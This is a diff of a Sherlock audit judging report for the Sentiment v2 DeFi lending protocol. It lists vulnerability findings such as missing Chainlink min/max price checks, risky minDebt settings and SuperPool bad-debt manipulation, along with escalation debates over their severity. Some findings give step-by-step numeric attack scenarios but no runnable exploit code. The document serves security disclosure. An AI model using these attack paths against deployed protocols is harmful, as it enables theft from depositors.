@@ -4681,132 +5321,460 @@ Manual Review
 ## Recommendation
 Monitor for bad debt and manage the bad debt pool
 
-# Issue M-44: `feeRecipeint` lacks setter function 
 
-Source: https://github.com/sherlock-audit/2024-08-sentiment-v2-judging/issues/571 
+
+## Discussion
+
+**S3v3ru5**
+
+This is a duplicate of #487 
+
+**Kalogerone**
+
+Escalate as per above comment
+
+**sherlock-admin3**
+
+> Escalate as per above comment
+
+You've created a valid escalation!
+
+To remove the escalation from consideration: Delete your comment.
+
+You may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.
+
+**0xdeth**
+
+Escalating this to make this a low.
+
+All the following have to take place in order for this attack to be pulled off.
+
+- Very low likelihood to have bad debt. Liquidating bad debt is a last resort and liquidators should have liquidated the position long before the bad debt was hit.
+- Pool owner and reallocators are responsible to handle riskier pools, by changing deposit/withdraw orders, blocking deposits on riskier pools (setting poolCap = 0) or entirely removing riskier pools.
+- Having such pool order is not guaranteed and depositors trust owner and allocators to have the riskiest pool in the beginning of the withdraw queue, which makes the exploit path impossible in such cases.
+
+We aren't arguing the issue is invalid, but the likelihood of all the above pieces falling in place are very low, thus we believe this is a Low severity issue.
+
+**elhajin**
+
+i think this is invalid , (Regardless of the very low likelihood)
+let's analyze the example in both cases with the attack and normal case : 
+
+**Scenario 1: No Attacker**
+
+Initial state:
+- PoolA: 100 Value, 100 Shares
+- PoolB: 100 Value, 100 Shares
+- SuperPool: 100 Shares in PoolA, 100 Shares in PoolB , superPoolShares is 200
+
+1. Bad debt of 100 Value slashed from PoolA:
+   - PoolA: 0 Value, 100 Shares
+   - PoolB: 100 Value, 100 Shares
+   - SuperPool: 100 Shares in PoolA (worth 0 Value), 100 Shares in PoolB (worth 100 Value)
+
+2. Final state:
+   - SuperPool share value = (0 + 100) / 200 = 0.5 Value per share
+
+**Scenario 2: With Attacker**
+
+Initial state:
+- PoolA: 100 Value, 100 Shares
+- PoolB: 100 Value, 100 Shares
+- SuperPool: 100 Shares in PoolA, 100 Shares in PoolB , superPoolShares is 200
+
+1. Attacker deposits 100 Value to PoolA through SuperPool:
+   - PoolA: 200 Value, 200 Shares
+   - PoolB: 100 Value, 100 Shares
+   - SuperPool: 200 Shares in PoolA (worth 200 Value), 100 Shares in PoolB (worth 100 Value) , superPoolShares is 300
+
+2. Attacker withdraws from PoolB:
+   - PoolA: 200 Value, 200 Shares
+   - PoolB: 0 Value, 0 Shares
+   - SuperPool: 200 Shares in PoolA (worth 200 Value), 0 Shares in PoolB , superPoolShares is 200
+
+3. Bad debt of 100 Value slashed from PoolA:
+   - PoolA: 100 Value, 200 Shares
+   - PoolB: 0 Value, 0 Shares
+   - SuperPool: 200 Shares in PoolA (worth 100 Value), 0 Shares in PoolB
+
+4. Final state:
+   - SuperPool share value = 100 / 200 = 0.5 Value per share
+
+In both scenarios, the final value per share in the SuperPool is 0.5 Value. the attacker's actions did not result in any additional loss or gain ,The attacker essentially wasted gas on unnecessary transactions without affecting the overall outcome.
+
+
+**iamnmt**
+
+@elhajin 
+
+The example in this issue does not demonstrate the loss for the super pool, but the super pool will take a larger loss if it has more assets in the slashed pool.
+
+<details>
+  <summary>Example when there is a loss</summary>
+
+**Scenario 1: No Attacker**
+
+Initial state:
+- PoolA: 200 Value, 200 Shares
+- PoolB: 100 Value, 100 Shares
+- SuperPool: 100 Shares in PoolA, 100 Shares in PoolB , superPoolShares is 200
+
+1. Bad debt of 100 Value slashed from PoolA:
+   - PoolA: 100 Value, 200 Shares
+   - PoolB: 100 Value, 100 Shares
+   - SuperPool: 100 Shares in PoolA (worth 0.5 Value), 100 Shares in PoolB (worth 100 Value)
+2. Final state:
+   - SuperPool total assets: 0.5 * 100 + 1 * 100 = 150 Value
+   
+**Scenario 2: With Attacker**
+
+Initial state:
+- PoolA: 200 Value, 200 Shares
+- PoolB: 100 Value, 100 Shares
+- SuperPool: 100 Shares in PoolA, 100 Shares in PoolB , superPoolShares is 200
+
+1. Attacker deposits 100 Value to PoolA through SuperPool:
+   - PoolA: 300 Value, 300 Shares
+   - PoolB: 100 Value, 100 Shares
+   - SuperPool: 200 Shares in PoolA (worth 200 Value), 100 Shares in PoolB (worth 100 Value) , superPoolShares is 300
+
+2. Attacker withdraws from PoolB:
+   - PoolA: 300 Value, 300 Shares
+   - PoolB: 0 Value, 0 Shares
+   - SuperPool: 200 Shares in PoolA (worth 200 Value), 0 Shares in PoolB , superPoolShares is 200
+
+3. Bad debt of 100 Value slashed from PoolA:
+   - PoolA: 200 Value, 300 Shares
+   - PoolB: 0 Value, 0 Shares
+   - SuperPool: 200 Shares in PoolA (worth 2/3 * 200 Value), 0 Shares in PoolB
+
+Final state:
+   - SuperPool total assets: 2/3 * 200 = 400/3 (approximately 133) Value
+
+</details>
+
+@0xdeth 
+
+> Very low likelihood to have bad debt. Liquidating bad debt is a last resort and liquidators should have liquidated the position long before the bad debt was hit.
+
+Sherlock's rules don't take likelihood into consideration. Referring to #487 for the pre-conditions for this attack to be possible.
+
+> Pool owner and reallocators are responsible to handle riskier pools, by changing deposit/withdraw orders, blocking deposits on riskier pools (setting poolCap = 0) or entirely removing riskier pools.
+
+Yes the reallocation bots are responsible for move assets from the risky pools to the safer pools. But I believe saying the pool owner will set poolCap to zero is not a fair argument because for two reasons:
+- Why setting the poolCap the zero when there is no assets in it? 
+- Setting poolCap and changing deposit/withdraw queue orders are the pool owner actions not the reallocation bots actions. The contest `README` provides only about the action of the reallocation bots
+
+> Are there any off-chain mechanisms or off-chain procedures for the protocol (keeper bots, arbitrage bots, etc.)?
+> Liquidator bots: maintain protocol solvency through timely liquidation of risky positions
+> Reallocation bots: used to rebalance SuperPool deposits among respective base pools
+
+> Having such pool order is not guaranteed and depositors trust owner and allocators to have the riskiest pool in the beginning of the withdraw queue, which makes the exploit path impossible in such cases.
+
+Yes it is not guaranteed, therefore it is the pre-conditions. However, it is not guaranteed that the riskiest pool will get slashed first. Let say the order of the withdraw queue is `[A, B,..]`. The owner set `A` at the beginning because it is the riskiest pool. But `B` could get slashed first, and the attacker will move assets to `B` to cause loss to the super pool.
+
+Moreover, refer to #487 for the attack path that levering flash loan. The attacker can move assets to a specific base pool when the pre-conditions are met.
+
+
+**cvetanovv**
+
+I agree with @iamnmt 
+
+The issue highlights a situation where SuperPool's queue order can be exploited by an attacker, causing losses to other depositors during bad debt liquidation. 
+
+Even though reallocation bots and pool owners are expected to manage risk, there is still a potential for harm. 
+
+Therefore, I believe this issue can be a Medium severity.
+
+Planning to reject both escalation and leave the issue as is.
+
+**Evert0x**
+
+Result:
+Medium
+Has Duplicates
+
+**sherlock-admin2**
+
+Escalations have been resolved successfully!
+
+Escalation status:
+- [Kalogerone](https://github.com/sherlock-audit/2024-08-sentiment-v2-judging/issues/564/#issuecomment-2352481300): rejected
+
+# Issue M-21: `ChainlinkOracle` doesn't validate for minAnswer/maxAnswer 
+
+Source: https://github.com/sherlock-audit/2024-08-sentiment-v2-judging/issues/570 
+
+The protocol has acknowledged this issue.
 
 ## Found by 
-hash
+0xDemon, MohammedRizwan, Obsidian, X12, dimah7, hash
 ## Summary
-`feeRecipeint` lacks setter function
+`ChainlinkOracle` doesn't validate for minAnswer/maxAnswer
 
 ## Vulnerability Detail
-The `feeRecipient` variable of Pool.sol is intended to be updated but lacks a setter function and hence cannot be updated
-
-## Impact
-`feeRecipient` cannot be updated
-
-## Code Snippet
-https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/0b472f4bffdb2c7432a5d21f1636139cc01561a5/protocol-v2/src/Pool.sol#L50
-
-## Tool used
-Manual Review
-
-## Recommendation
-Add a setter function
-
-# Issue M-45: Incorrect decimal adjustment in `ChainlinkUsdOracle` 
-
-Source: https://github.com/sherlock-audit/2024-08-sentiment-v2-judging/issues/579 
-
-## Found by 
-0x5chn0uf, 0xAlix2, A2-security, Chad0, JCN, KupiaSec, Obsidian, Ryonen, Tendency, ZeroTrust, admin, cawfree, chaduke, codertjay, h2134, hash, robertodf, tvdung94
-## Summary
-Incorrect decimal adjustment in `ChainlinkUsdOracle`
-
-## Vulnerability Detail
-When adjusting for the decimals, the bracks are ommitted causing incorrect division
+Current implementation of `ChainlinkOracle` doesn't validate for the minAnswer/maxAnswer values
+[link](https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/0b472f4bffdb2c7432a5d21f1636139cc01561a5/protocol-v2/src/oracle/ChainlinkUsdOracle.sol#L114-L120)
 ```solidity
-    function getValueInEth(address asset, uint256 amt) external view returns (uint256) {
-        
-        ....
-
-        if (decimals <= 18) return (amt * 10 ** (18 - decimals)).mulDiv(uint256(assetUsdPrice), uint256(ethUsdPrice));
-=>      else return (amt / (10 ** decimals - 18)).mulDiv(uint256(assetUsdPrice), uint256(ethUsdPrice));
+    function _getPriceWithSanityChecks(address asset) private view returns (uint256) {
+        address feed = priceFeedFor[asset];
+        (, int256 price,, uint256 updatedAt,) = IAggegregatorV3(feed).latestRoundData();
+        if (price <= 0) revert ChainlinkUsdOracle_NonPositivePrice(asset);
+        if (updatedAt < block.timestamp - stalePriceThresholdFor[feed]) revert ChainlinkUsdOracle_StalePrice(asset);
+        return uint256(price);
     }
 ```
 
-Eg:
-Decimals was 19, then instead of dividing by 10**(19-18), the division will be performed by ~10**19 itself. Casuing massive loss in the value
+Chainlink still has feeds that uses the min/maxAnswer to limit the range of values and hence in case of a price crash, incorrect price will be used to value the assets allowing user's to exploit this incorrectness by depositing the overvalued asset and borrowing against it. Since the project plans to deploy in `Any EVM-compatbile network`, I am attaching the link to BNB/USD oracle which still uses min/maxAnswer and is one of the highest tvl tokens in BSC https://bscscan.com/address/0x137924d7c36816e0dcaf016eb617cc2c92c05782#readContract, similar check exists for ETH/USD
 
 ## Impact
-Incorrect valuation of assets breaking every calculation dependent on it, for eg: debt valuation,collateral valuation etc.
+In the even of a flash crash, user's lenders will loose their assets
 
 ## Code Snippet
-https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/0b472f4bffdb2c7432a5d21f1636139cc01561a5/protocol-v2/src/oracle/ChainlinkUsdOracle.sol#L86
+https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/0b472f4bffdb2c7432a5d21f1636139cc01561a5/protocol-v2/src/oracle/ChainlinkUsdOracle.sol#L114-L120
 
 ## Tool used
 Manual Review
 
 ## Recommendation
-Change to 10 ** (decimals - 18)
+If the price is outside the minPrice/maxPrice of the oracle, activate a breaker to reduce further losses
 
-# Issue M-46: New depositors can loose their assets due to existing shares when totalAssets is 0 following a bad debt rebalance 
 
-Source: https://github.com/sherlock-audit/2024-08-sentiment-v2-judging/issues/584 
+
+## Discussion
+
+**z3s**
+
+mixAnswer/ maxAnswer is optional and not on all feeds, so protocol don't impose the check anywhere.
+
+**0xMR0**
+
+Escalate
+
+
+
+**sherlock-admin3**
+
+> Escalate
+> 
+> 
+
+You've created a valid escalation!
+
+To remove the escalation from consideration: Delete your comment.
+
+You may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.
+
+**0xMR0**
+
+This is wrongly excluded and should be considered valid as per sherlock rule. 
+
+> Chainlink Price Checks: Issues related to minAnswer and maxAnswer checks on Chainlink's Price Feeds are considered medium only if the Watson explicitly mentions the price feeds (e.g. USDC/ETH) that require this check.
+
+duplicate following above sherlock rule should also be considered valid.
+
+**Emanueldlvg**
+
+Hi @z3s ,thanks for fast judging. I agree with @0xMR0 , based on README contest, token scope will be : 
+> **If you are integrating tokens, are you allowing only whitelisted tokens to work with the codebase or any complying with the standard? Are they assumed to have certain properties, e.g. be non-reentrant? Are there any types of [[weird tokens](https://github.com/d-xo/weird-erc20)](https://github.com/d-xo/weird-erc20) you want to integrate?**
+> 
+> 
+> Tokens are whitelisted, only tokens with valid oracles can be used to create Base Pools.
+> 
+> Protocol governance will ensure that oracles are only set for standard ERC-20 tokens (plus USDC/USDT)
+>
+and sherlock rule : 
+> **Chainlink Price Checks:** Issues related to `minAnswer` and `maxAnswer` checks on Chainlink's Price Feeds are considered medium **only** if the Watson explicitly mentions the price feeds (e.g. USDC/ETH) that require this check
+>
+
+**0xspearmint1**
+
+escalate
+
+The valid duplicates of this issue are [#27](https://github.com/sherlock-audit/2024-08-sentiment-v2-judging/issues/27) and [#120](https://github.com/sherlock-audit/2024-08-sentiment-v2-judging/issues/120)
+
+Sherlock rules have clearly stated the following:
+>Chainlink Price Checks: Issues related to minAnswer and maxAnswer checks on Chainlink's Price Feeds are considered medium only if the Watson explicitly mentions the price feeds (e.g. USDC/ETH) that require this check
+
+[#357](https://github.com/sherlock-audit/2024-08-sentiment-v2-judging/issues/357) is invalid because they linked aggregators that are deprecated, here are the links to the current aggregators for [USDC/USD](https://etherscan.io/address/0xc9E1a09622afdB659913fefE800fEaE5DBbFe9d7#readContract#F23), [ETH/USD](https://etherscan.io/address/0xE62B71cf983019BFf55bC83B48601ce8419650CC#readContract#F19) and [BTC/USD](https://etherscan.io/address/0xdBe1941BFbe4410D6865b9b7078e0b49af144D2d#readContract#F19), ALL of them have a min price of 1 since they are deprecated
+
+[#259](https://github.com/sherlock-audit/2024-08-sentiment-v2-judging/issues/259) is invalid because the watson mentioned a priceFeed that has a minPrice = 1, this is a price feed that used to have a real minAnswer but chainlink deprecated it.
+
+[#337](https://github.com/sherlock-audit/2024-08-sentiment-v2-judging/issues/337) is invalid for the same reasons as [#259]
+
+**sherlock-admin3**
+
+> escalate
+> 
+> The valid duplicates of this issue are [#27](https://github.com/sherlock-audit/2024-08-sentiment-v2-judging/issues/27) and [#120](https://github.com/sherlock-audit/2024-08-sentiment-v2-judging/issues/120)
+> 
+> Sherlock rules have clearly stated the following:
+> >Chainlink Price Checks: Issues related to minAnswer and maxAnswer checks on Chainlink's Price Feeds are considered medium only if the Watson explicitly mentions the price feeds (e.g. USDC/ETH) that require this check
+> 
+> [#357](https://github.com/sherlock-audit/2024-08-sentiment-v2-judging/issues/357) is invalid because they linked aggregators that are deprecated, here are the links to the current aggregators for [USDC/USD](https://etherscan.io/address/0xc9E1a09622afdB659913fefE800fEaE5DBbFe9d7#readContract#F23), [ETH/USD](https://etherscan.io/address/0xE62B71cf983019BFf55bC83B48601ce8419650CC#readContract#F19) and [BTC/USD](https://etherscan.io/address/0xdBe1941BFbe4410D6865b9b7078e0b49af144D2d#readContract#F19), ALL of them have a min price of 1 since they are deprecated
+> 
+> [#259](https://github.com/sherlock-audit/2024-08-sentiment-v2-judging/issues/259) is invalid because the watson mentioned a priceFeed that has a minPrice = 1, this is a price feed that used to have a real minAnswer but chainlink deprecated it.
+> 
+> [#337](https://github.com/sherlock-audit/2024-08-sentiment-v2-judging/issues/337) is invalid for the same reasons as [#259]
+
+You've created a valid escalation!
+
+To remove the escalation from consideration: Delete your comment.
+
+You may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.
+
+**0xRizwan**
+
+> Chainlink Price Checks: Issues related to minAnswer and maxAnswer checks on Chainlink's Price Feeds are considered medium only if the Watson explicitly mentions the price feeds (e.g. USDC/ETH) that require this check
+
+Sherlock rule clearly states to `explicitly mentions the price feeds (e.g. USDC/ETH)` and linking the price feeds address is additional information by auditors. I believe, all such issues following above rule should be Medium severity.
+
+**Blngogo**
+
+Thanks to spearmint for trying to invalidate most of the reports. I guess trying to help a buddy to get higher payout. However #357 describes the same root cause and impact as the duplicates, the links for the aggregators are not deprecated, if you check the tx history you can see there are active tx's going on, more specifically the `USDC/USD` link. Requirements per Sherlock are: "Chainlink Price Checks: Issues related to minAnswer and maxAnswer checks on Chainlink's Price Feeds are considered medium only if the Watson explicitly mentions the price feeds (e.g. USDC/ETH) that require this check". And this requirement is fulfilled in this report.
+
+**cvetanovv**
+
+For my decision on this escalation, I will entirely rely on the Sherlock rule:
+
+> Chainlink Price Checks: Issues related to `minAnswer` and `maxAnswer` checks on Chainlink's Price Feeds are considered medium only if the Watson explicitly **mentions** the price feeds (e.g. USDC/ETH) that require this check.
+
+All the duplicate issues have mentioned the price feeds. We have no information that it is mandatory to provide links.
+
+Planning to accept @0xMR0 escalation and make this issue Medium severity, including all duplicates.
+
+**Evert0x**
+
+Result:
+Medium
+Has Duplicates 
+
+**sherlock-admin4**
+
+Escalations have been resolved successfully!
+
+Escalation status:
+- [0xMR0](https://github.com/sherlock-audit/2024-08-sentiment-v2-judging/issues/570/#issuecomment-2351921809): accepted
+- [0xspearmint1](https://github.com/sherlock-audit/2024-08-sentiment-v2-judging/issues/570/#issuecomment-2355368290): rejected
+
+# Issue M-22: Setting `minDebt` and `minBorrow` to low values can cause protocol to accrue bad debt 
+
+Source: https://github.com/sherlock-audit/2024-08-sentiment-v2-judging/issues/572 
+
+The protocol has acknowledged this issue.
 
 ## Found by 
-Nihavent, S3v3ru5, hash
+AlexCzm, EgisSecurity, hash, pseudoArtist, serial-coder, sheep
 ## Summary
-New depositors can loose their assets due to existing shares even when totalAssets is 0
+Setting `minDebt` and `minBorrow` to low values can cause protocol to accrue bad debt as liquidators won't find enough incentive in clearing the low debt and also depending on the price, users may be able to borrow dust without providing collateral
 
 ## Vulnerability Detail
-Having 0 totalAssets and non-zero shares is a possible scenario due to rebalacne
+`minDebt` and `minBorrow` are supposed to be settable from 0
+
+[link](https://github.com/sherlock-audit/2024-08-sentiment-v2/tree/main?tab=readme-ov-file#q-are-there-any-limitations-on-values-set-by-admins-or-other-roles-in-the-codebase-including-restrictions-on-array-lengths)
 ```solidity
-    function rebalanceBadDebt(uint256 poolId, address position) external {
-        
-        ....
-        //@auidt decreases totalDepositAssets while shares can be non-zero
-        uint256 totalDepositAssets = pool.totalDepositAssets;
-        pool.totalDepositAssets = (totalDepositAssets > borrowAssets) ? totalDepositAssets - borrowAssets : 0;
+Min Debt = from 0 to 0.05 ETH = from 0 to 50000000000000000
+Min Borrow = from 0 to 0.05 ETH = from 0 to 50000000000000000
 ```
 
-In such a case, if a new user deposits, it will not revert but instead mint shares 1:1 with the assets. But as soon as it is minted, the value of the user's share will decrease because of the already existing shares
-
-```solidity
-    function deposit(uint256 poolId, uint256 assets, address receiver) public returns (uint256 shares) {
-        
-        ....
-
-        shares = _convertToShares(assets, pool.totalDepositAssets, pool.totalDepositShares, Math.Rounding.Down);
-```
-
-```solidity
-    function _convertToShares(
-        uint256 assets,
-        uint256 totalAssets,
-        uint256 totalShares,
-        Math.Rounding rounding
-    ) internal pure returns (uint256 shares) {
-        if (totalAssets == 0) return assets;
-        shares = assets.mulDiv(totalShares, totalAssets, rounding);
-    }
-```
-
-Eg:
-deposit shares = 100, deposit assets = 100, borrow assets = 100
-borrow position becomes bad debt and rebalance bad debt is invoked
-now deposit shares = 100, deposit assets = 0
-new user calls deposit with 100 assets
-they get 100 shares in return but share value is now 0.5 and they can withdraw only 50
-
-This can occur if a large position undergoes a rebalance and the others manage to withdraw their assets right before the rebalance (superpool dominated pools can higher chances of such occurence) 
+Setting these to low values will allow positions to be created with low debts and liquidations won't happen on small positions due to it not generating enough profit to cover the costs of the liquidator. This will cause the protocol to accure bad debt. 
+Also if both are set to dust, the roundings will become significant and allows one to borrow dust amounts without proper collateral. Eg, if both are set to 0 and the price of assets is less than that of eth, the borrowing 1 wei of the assets will require no collateral as the value in eth will be rounded to 0  
 
 ## Impact
-Users can loose their assets when depositing to pools that have freshly undergone rebalanceBadDebt
+Protocol can accrue bad debt leading to depositors loosing their assets in case the values are set low
 
 ## Code Snippet
-https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/0b472f4bffdb2c7432a5d21f1636139cc01561a5/protocol-v2/src/Pool.sol#L275
-
-https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/0b472f4bffdb2c7432a5d21f1636139cc01561a5/protocol-v2/src/Pool.sol#L547
+https://github.com/sherlock-audit/2024-08-sentiment-v2/tree/main?tab=readme-ov-file#q-are-there-any-limitations-on-values-set-by-admins-or-other-roles-in-the-codebase-including-restrictions-on-array-lengths
 
 ## Tool used
 Manual Review
 
 ## Recommendation
-If totalShares is non-zero and totalAssets is zero, revert for deposits
+Ensure the `minDebt`,`minBorrow` values are not decreased below a certain threshold
 
-# Issue M-47: User's can create non-liquidateable positions by leveraging `rebalanceBadDebt` to decrease share price 
+
+
+## Discussion
+
+**z3s**
+
+Admin won't set minDebt and/or minBorrow to zero
+
+**serial-coder**
+
+*I cannot escalate the issue due to insufficient escalation threshold*
+
+Hi @z3s,
+
+Your [statement](https://github.com/sherlock-audit/2024-08-sentiment-v2-judging/issues/572#issuecomment-2351741088) is not true:
+> Admin won't set minDebt and/or minBorrow to zero
+
+Please refer to the following excerpts from the contest public channel.
+
+- ruvaag (sponsor): "**another common query regarding minDebt and defaultInterestFee, while they won't be zero in our current deployment, they could be zero in future deployments**" (https://discord.com/channels/812037309376495636/1273304663277572096/1275023937687916595)
+
+- 0xb0k0 (watson): "**what about minBorrow amount? Do you plan on having a 0 amount for it in the future?**" (https://discord.com/channels/812037309376495636/1273304663277572096/1275033430140387359)
+
+- ruvaag (sponsor): "**yes while not in this deployment, we could set this in a future deployment. so if there are issues arising from that, we'd like to know so that beforehand**" (https://discord.com/channels/812037309376495636/1273304663277572096/1275066936669245571)
+
+Furthermore, the "**Sponsor Confirmed**" tag also confirms that the sponsor considers this issue valid.
+
+Thanks for your time.
+
+**kazantseff**
+
+Escalate,
+per the above comment
+
+**sherlock-admin3**
+
+> Escalate,
+> per the above comment
+
+You've created a valid escalation!
+
+To remove the escalation from consideration: Delete your comment.
+
+You may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.
+
+**cvetanovv**
+
+I agree with the escalation.
+
+In the Readme, we have values that the TRUSTED admin will set. That is exactly the purpose of this question in the Readme:
+https://github.com/sherlock-audit/2024-08-sentiment-v2?tab=readme-ov-file#q-are-there-any-limitations-on-values-set-by-admins-or-other-roles-in-the-codebase-including-restrictions-on-array-lengths
+
+There we can see that the admin will use low values for `Min Debt` and `Min Borrow`:
+>Min Debt = from 0 to 0.05 ETH 
+> Min Borrow = from 0 to 0.05 ETH
+
+If low values are set for `minDebt` and `minBorrow`, a liquidator will have no incentive to liquidate the position. This means that the protocol can accrue bad debt.
+
+Planning to accept the escalation and make this issue a Medium severity.
+
+**WangSecurity**
+
+Result:
+Medium
+Has duplicates
+
+**sherlock-admin4**
+
+Escalations have been resolved successfully!
+
+Escalation status:
+- [kazantseff](https://github.com/sherlock-audit/2024-08-sentiment-v2-judging/issues/572/#issuecomment-2354471626): accepted
+
+**AlexCZM**
+
+Note to @cvetanovv:
+https://github.com/sherlock-audit/2024-08-sentiment-v2-judging/issues/181 is a duplicate. Moreover that issue has a more complete description and I propose to make it the main issue.
+
+**cvetanovv**
+
+@AlexCZM I agree that #181 is a duplicate of this issue and will duplicate it. 
+
+# Issue M-23: User's can create non-liquidateable positions by leveraging `rebalanceBadDebt` to decrease share price 
 
 Source: https://github.com/sherlock-audit/2024-08-sentiment-v2-judging/issues/585 
 
@@ -4859,148 +5827,229 @@ Manual Review
 ## Recommendation
 Can't think of any good solution if a position has to have the ability to borrow from multiple pools using the same collateral backing
 
-# Issue M-48: Calculation issue will impact in loss in user funds and DOS 
 
-Source: https://github.com/sherlock-audit/2024-08-sentiment-v2-judging/issues/601 
 
-## Found by 
-Darinrikusham
-### Summary
+## Discussion
 
-In withdraw function in pool.sol contract while calculating amount of shares it is rounding up which results in loss in user funds and DOS as user will not be able to fully withdraw the deposited assets and Superpool is also not compliant with ERC 4626.
+**S3v3ru5**
 
-### Root Cause
+I do not consider this issue to have medium severity.
 
-The choice to round up on [pool.sol:350](https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/main/protocol-v2/src/Pool.sol#L350) is a mistake as it results in loss of user funds and DOS as user can't withdraw the full asset amount. It also affects withdraw function in SuperPool.sol as underneath it calls withdraw function on pool.sol
+First of, I agree it is possible for an attacker to make `totalDepositShares` to be near `uint256.max`. Very good exploit. I do not think the attack is viable though.
 
-### Internal pre-conditions
+I agree with an attacker can make "totalDepositShares" to be near `uint256.max`.
+I do **not** agree with viability of the impact, hence the severity.
 
-It will happen in all scenarios after interest is accrued and peg is not 1:1 between assets and shares.
+My main reason is the cost of the attack.
 
-### External pre-conditions
+The exploit scenario says `isPositionHealthy` starts failing because of overflow after some time (because of fees). The attack has two main steps after making the `totalDepositShares = ~uint256.max`
 
-_No response_
+1. Attacker borrows before the `isPositionHealthy` starts failing
+2. After  `isPositionHealthy` starts failing, the position becomes unliquidatable
 
-### Attack Path
+As a result, the other pools which the attacker borrowed from will incur bad debt equal to `bad debt`.
 
-1. In [testTimeIncreasesDebt](https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/main/protocol-v2/test/core/Pool.t.sol#L217) test case after time is elapsed, debt is increased and interest is accrued if a user deposits funds and later tries to withdraw all the funds they are not able to withdraw it all due to issue in calculation
+In step 1, if the attacker was able to borrow `borrowedAmount` then that means attacker position has sufficient collateral greater than `borrowedAmount`.
 
-### Impact
+The value of the collateral needs to be more than the value of the borrowed amount because of LTV < 100%.
 
-The user loose a part of deposited asset amount and can't withdraw the deposited amount fully causing [withdraw](https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/main/protocol-v2/src/Pool.sol#L339) function unusable to withdraw all assets and also cause the same DOS issue in superPool withdraw function. 
+Note, once `isPositionHealthy` starts failing, no operations can be performed. Because every operation includes `isPositionHealthy` check at the end. As a result,
 
-### PoC
+**The loss to protocol pools from attack (borrowed amount) is significantly less than loss to the attacker(collateral amount)**.
 
-In Pool.t.sol
+Hence, I consider this attack to be non-viable. Should this issue still be considered `medium` severity?
+
+
+Also the difficulty to make "totalDepositShares" to be `~uint256.max` is high.
+
+Attacker can make "totalDepositShares` to be near `uint256.max`.
+
+Difficult but is still possible. The difficulty to do this comes from
+
+1. Attacker deposits some tokens to over-collateralize the position in-order to borrow.
+    - Small amounts, can be negligible.
+2. The collateral token has to lose its value relative to borrowed token, to make the value of collateral to be less than the borrowed tokens.
+    - Possible for a few times.
+3. The position has to incur bad debt i.e The position is not liquidated for some reason.
+
+The main difficulty in making the "totalDepsitShares" to near `uint256.max` comes from "position incuring bad debt". It is possible once or twice, the position is not liquidated before incuring bad debt but the attack requires multiple times (atleast 30 times without increasing the cost non-negligible). 
+
+I consider this to be very difficult to make it happen. 
+
+Liquidating the position before incuring bad debt is intended behavior, attacker cannot keep liquidators from liquidating their position.
+
+The attack is based on position incuring bad debt i.e Liquidators not liquidating the position on time. The chances of this and the same pool incuring bad debt more than 30 times is very low. 
+
+I consider anyone of the following reasons is sufficient to not consider this issue as a medium:
+1. Attacker loses significantly more money than the protocol pools
+2. Difficulty to make "totalDepositShares" to be `~uint256.max` is high. Attacker cannot control the chances as well. The chances of this happening is very very low.
+
+**NicolaMirchev**
+
+Escalate.
+
+Why the severity should be downgraded to low based on the above comment.
+Additinally, max LTV regarding the README is set to 98%(We cannot have 100% LTV). That means liquidation bots will most probably try to liquidate the position, which means the probability drops even further.
+
+**sherlock-admin3**
+
+> Escalate.
+> 
+> Why the severity should be downgraded to low based on the above comment.
+> Additinally, max LTV regarding the README is set to 98%(We cannot have 100% LTV). That means liquidation bots will most probably try to liquidate the position, which means the probability drops even further.
+
+You've created a valid escalation!
+
+To remove the escalation from consideration: Delete your comment.
+
+You may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.
+
+**10xhash**
+
+> The loss to protocol pools from attack (borrowed amount) is significantly less than loss to the attacker(collateral amount)
+
+This is incorrect. The attacker only looses (collateral - borrowed amount) while the protocol looses borrowed amount which is significantly higher than (collateral - borrowed)
+
+> The attack is based on position incuring bad debt i.e Liquidators not liquidating the position on time. The chances of this and the same pool incuring bad debt more than 30 times is very low:
+
+Attacker has control of the pool and hence has ability to configure the pool with the params that will make normal liquidator's not incentivized to liquidate (low debt, high ltv etc). And it is not required to be done 30 times(I am not sure what the entire assumptions are that were used to reach this number) to eventually reach such a state
+
+**S3v3ru5**
+
+> This is incorrect. The attacker only looses (collateral - borrowed amount) while the protocol looses borrowed amount which is significantly higher than (collateral - borrowed)
+
+I am not sure I understand. For the position to be healthy, doesn't it require to have assets > borrowed at all times? If collateral token cannot be a debt token then doesn't it mean collateral tokens to be worth of at-least borrowed amount?
+
+Upd: So attacker transfers all borrowed assets to their account. The position is left with collateral assets. Attacker deposits collateral tokens and gets borrowed tokens. Attacker only lost (collateral - borrow) > protocol lost all borrowed amount. Agree with this point. Sorry for misunderstanding.
+
+> Attacker has control of the pool and hence has ability to configure the pool with the params that will make normal liquidator's not incentivized to liquidate (low debt, high ltv etc). And it is not required to be done 30 times(I am not sure what the entire assumptions are that were used to reach this number) to eventually reach such a state
+
+I think I followed the sceanario mentioned and came up with 70 iterations to have the negligible costs. I chose (did some calc on my mind but nothing concrete) 30 (far less than 70) to present my point. May be it requires far less iterations. How many does it require?
+
+I think the sentiment owner has the control over minBorrow and minDebt.
+LTV for a collateral can be set by a pool owner, however they are bounded by `minLTV` and `maxLTV` that are set by the sentiment owner.
+
+If this scenario requires sentiment owner to set `minDebt`, `minBorrow`, `maxLTV` to values which would make the liquidations non-profitable multiple times, then wouldn't that a problem for the rest of the pools as well? Doesn't this count as Sentiment owner mistake? i.e admin mistake? 
+
+
+
+**cvetanovv**
+
+I agree with @S3v3ru5 comments. While the exploit is technically possible, it's challenging to achieve.
+
+Liquidation mechanisms, LTV settings, `minDebt` and `minBorrow` restrictions would prevent the scenario from easily occurring. Additionally, the potential loss for the attacker would far outweigh the gains, as they would lose more collateral than the protocol loses in borrowed amounts.
+
+These are the main reasons why I think this issue is Low severity.
+
+Planning to accept the escalation and invalidate the issue.
+
+**10xhash**
+
+I am using the risk parameters as mentioned in the readme and the high LTV for the attack is set by an attacker (instead of a honest pool owner) and is not an obstacle
+
